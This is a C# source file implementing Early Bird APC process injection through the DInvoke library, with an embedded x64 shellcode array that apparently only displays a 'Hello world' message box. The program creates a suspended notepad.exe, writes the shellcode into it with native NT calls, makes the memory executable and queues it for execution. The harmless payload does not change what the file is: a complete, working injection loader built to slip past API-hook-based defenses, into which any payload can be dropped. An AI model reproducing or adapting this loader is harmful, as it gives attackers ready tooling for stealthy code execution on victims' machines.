﻿using System;
using System.Runtime.InteropServices;

//DInvoke
using Invoke = DInvoke.DynamicInvoke;
using Data = DInvoke.Data;

namespace DInvoke_EarlyBird
{
    internal class Program
    {
        // Shellcode as global
        private static byte[] scBuffer = new byte[] { 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x8d, 0x15, 0x66, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x52, 0x00, 0x00, 0x00, 0xe8, 0x9e, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xf8, 0x48, 0x8d, 0x0d, 0x5d, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x8d, 0x15, 0x5f, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x4d, 0x00, 0x00, 0x00, 0xe8, 0x7f, 0x00, 0x00, 0x00, 0x4d, 0x33, 0xc9, 0x4c, 0x8d, 0x05, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x4e, 0x00, 0x00, 0x00, 0x48, 0x33, 0xc9, 0xff, 0xd0, 0x48, 0x8d, 0x15, 0x56, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0xe8, 0x56, 0x00, 0x00, 0x00, 0x48, 0x33, 0xc9, 0xff, 0xd0, 0x4b, 0x45, 0x52, 0x4e, 0x45, 0x4c, 0x33, 0x32, 0x2e, 0x44, 0x4c, 0x4c, 0x00, 0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x55, 0x53, 0x45, 0x52, 0x33, 0x32, 0x2e, 0x44, 0x4c, 0x4c, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x41, 0x00, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x00, 0x48, 0x83, 0xec, 0x28, 0x65, 0x4c, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x40, 0x18, 0x4d, 0x8d, 0x60, 0x10, 0x4d, 0x8b, 0x04, 0x24, 0xfc, 0x49, 0x8b, 0x78, 0x60, 0x48, 0x8b, 0xf1, 0xac, 0x84, 0xc0, 0x74, 0x26, 0x8a, 0x27, 0x80, 0xfc, 0x61, 0x7c, 0x03, 0x80, 0xec, 0x20, 0x3a, 0xe0, 0x75, 0x08, 0x48, 0xff, 0xc7, 0x48, 0xff, 0xc7, 0xeb, 0xe5, 0x4d, 0x8b, 0x00, 0x4d, 0x3b, 0xc4, 0x75, 0xd6, 0x48, 0x33, 0xc0, 0xe9, 0xa7, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x58, 0x30, 0x44, 0x8b, 0x4b, 0x3c, 0x4c, 0x03, 0xcb, 0x49, 0x81, 0xc1, 0x88, 0x00, 0x00, 0x00, 0x45, 0x8b, 0x29, 0x4d, 0x85, 0xed, 0x75, 0x08, 0x48, 0x33, 0xc0, 0xe9, 0x85, 0x00, 0x00, 0x00, 0x4e, 0x8d, 0x04, 0x2b, 0x45, 0x8b, 0x71, 0x04, 0x4d, 0x03, 0xf5, 0x41, 0x8b, 0x48, 0x18, 0x45, 0x8b, 0x50, 0x20, 0x4c, 0x03, 0xd3, 0xff, 0xc9, 0x4d, 0x8d, 0x0c, 0x8a, 0x41, 0x8b, 0x39, 0x48, 0x03, 0xfb, 0x48, 0x8b, 0xf2, 0xa6, 0x75, 0x08, 0x8a, 0x06, 0x84, 0xc0, 0x74, 0x09, 0xeb, 0xf5, 0xe2, 0xe6, 0x48, 0x33, 0xc0, 0xeb, 0x4e, 0x45, 0x8b, 0x48, 0x24, 0x4c, 0x03, 0xcb, 0x66, 0x41, 0x8b, 0x0c, 0x49, 0x45, 0x8b, 0x48, 0x1c, 0x4c, 0x03, 0xcb, 0x41, 0x8b, 0x04, 0x89, 0x49, 0x3b, 0xc5, 0x7c, 0x2f, 0x49, 0x3b, 0xc6, 0x73, 0x2a, 0x48, 0x8d, 0x34, 0x18, 0x48, 0x8d, 0x7c, 0x24, 0x30, 0x4c, 0x8b, 0xe7, 0xa4, 0x80, 0x3e, 0x2e, 0x75, 0xfa, 0xa4, 0xc7, 0x07, 0x44, 0x4c, 0x4c, 0x00, 0x49, 0x8b, 0xcc, 0x41, 0xff, 0xd7, 0x49, 0x8b, 0xcc, 0x48, 0x8b, 0xd6, 0xe9, 0x14, 0xff, 0xff, 0xff, 0x48, 0x03, 0xc3, 0x48, 0x83, 0xc4, 0x28, 0xc3 };
        private static int scSize = scBuffer.Length;

        static void Main(string[] args)
        {
            // New structures for the process to reference to
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Notepad for PoC
            string notepad = "C:\\Windows\\System32\\notepad.exe";

            // Create process
            bool _CreateProcess = CreateProcess(null, notepad, IntPtr.Zero, IntPtr.Zero, false, (uint)0x4, IntPtr.Zero, null, ref si, out pi);
            if (_CreateProcess == false)
            {
                Console.WriteLine("[-] Failed creating process");
                return;
            }

            // Get information for create process
            IntPtr pHandle = pi.hProcess;
            IntPtr tHandle = pi.hThread;
            int ProcessId = pi.dwProcessId;

            // Permissions for full remote handle access
            uint _SEC_COMMIT = Data.Win32.Kernel32.MEM_COMMIT;
            uint _SEC_RESERVE = Data.Win32.Kernel32.MEM_RESERVE;

            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr sSize = (IntPtr)scSize;

            Console.WriteLine("[*] Process information: \n\t" +
                "- Process Handle: {0}\n\t" +
                "- Thread Handle: {1}\n\t" +
                "- Process ID: {2}", pHandle.ToInt64(), tHandle.ToInt64(), ProcessId);

            // Allocate memory to process
            IntPtr pNtAlloc = Invoke.Native.NtAllocateVirtualMemory(pHandle, ref BaseAddress, IntPtr.Zero, ref sSize, _SEC_COMMIT | _SEC_RESERVE, (uint)PageProtection.READWRITE);
            Console.WriteLine("[*] Pointer to memory -> 0x{0:X}", pNtAlloc.ToInt64());

            // Local allocation in "self"
            IntPtr buffer = Marshal.AllocHGlobal(scSize);
            Marshal.Copy(scBuffer, 0, buffer, scSize);

            // Write shellcode to created process
            if (Invoke.Native.NtWriteVirtualMemory(pHandle, BaseAddress, buffer, (uint)scSize) == 1)
            {
                Console.WriteLine("[X] Failed writing to remote process");
                return;
            }

            // Free allocated memory
            Marshal.FreeHGlobal(buffer);

            // Switch memory protection to executable
            if (Invoke.Native.NtProtectVirtualMemory(pHandle, ref BaseAddress, ref sSize, (uint)PageProtection.EXECUTE_READ) == 1)
            {
                Console.WriteLine("[X] Failed modifing memory page protection");
                return;
            }

            // Queue the thread for shellcode execution
            Invoke.Native.NtQueueApcThread(tHandle, BaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("[+] APC Thread Queued !");

            // Resume thread to execute shellcode
            NtResumeThread(tHandle, 0);
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtResumeThread(IntPtr hThread, uint dwSuspendCount);

        // Memory protection constants
        [Flags]
        enum PageProtection : uint
        {
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            GUARD = 0x100,
            NOCACHE = 0x200,
            WRITECOMBINE = 0x400
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        // This also works with CharSet.Ansi as long as the calling function uses the same character set.
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
    }
}
